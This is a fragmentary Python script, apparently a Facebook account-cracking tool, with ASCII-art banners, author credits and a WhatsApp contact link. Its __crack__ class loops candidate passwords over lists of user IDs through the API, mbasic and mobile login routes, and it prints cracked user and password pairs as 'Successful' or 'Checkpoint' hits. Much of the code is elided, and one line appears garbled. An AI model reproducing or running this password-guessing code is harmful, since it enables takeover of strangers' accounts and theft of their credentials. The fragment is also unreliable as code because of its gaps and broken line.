...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			IMTIAZ_AKING(' [1] SAFI Method 1 ')

			IMTIAZ_AKING(' [2] SAFI Method 2  [ Pro ]')

			IMTIAZ_AKING(' [3] SAFI Method 3   ')
	...
	def __api__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;97m [SAFI] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				...
				IMTIAZ_AKING('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
				...
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				IMTIAZ_AKING('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
				...
				try:
					...
					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				IMTIAZ_AKING('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
...
| | _____  _____ | || |      __      | || |    ___       | || |     _____    | || |     _____    | | | |  ________    | || |  _________   | || | ____   ____  | || |     _____    | || |   _____      | |

| ||_   _||_   _|| || |     /  \     | || |  .'   '.     | || |    |_   _|   | || |    |_   _|   | | | | |_   ___ `.  | || | |_   ___  |  | || ||_  _| |_  _| | || |    |_   _|   | || |  |_   _|     | |

| |  | | /\ | |  | || |    / /\ \    | || | /  .-.  \    | || |      | |     | || |      | |     | | | |   | |   `. \ | || |   | |_  \_|  | || |  \ \   / /   | || |      | |     | || |    | |       | |

| |  | |/  \| |  | || |   / ____ \   | || | | |   | |    | || |      | |     | || |      | |     | | | |   | |    | | | || |   |  _|  _   | || |   \ \ / /    | || |      | |     | || |    | |   _   | |

| |  |   /\   |  | || | _/ /    \ \_ | || | \  `-'  \_   | || |     _| |_    | || |     _| |_    | | | |  _| |___.' / | || |  _| |___/ |  | || |    \ ' /     | || |     _| |_    | || |   _| |__/ |  | |

| |  |__/  \__|  | || ||____|  |____|| || |  `.___.\__|  | || |    |_____|   | || |    |_____|   | | | | |________.'  | || | |_________|  | || |     \_/      | || |    |_____|   | || |  |________|  | |
...
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 ...
 [*]=============================================
    ...
    AuthoAuthor SarDar WaQii 

    Facebook : https://https://www.facebook.com/SaRdaRWaQiiKhaN

    Team     : SarDar WaQii Devil 
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+923159620940")
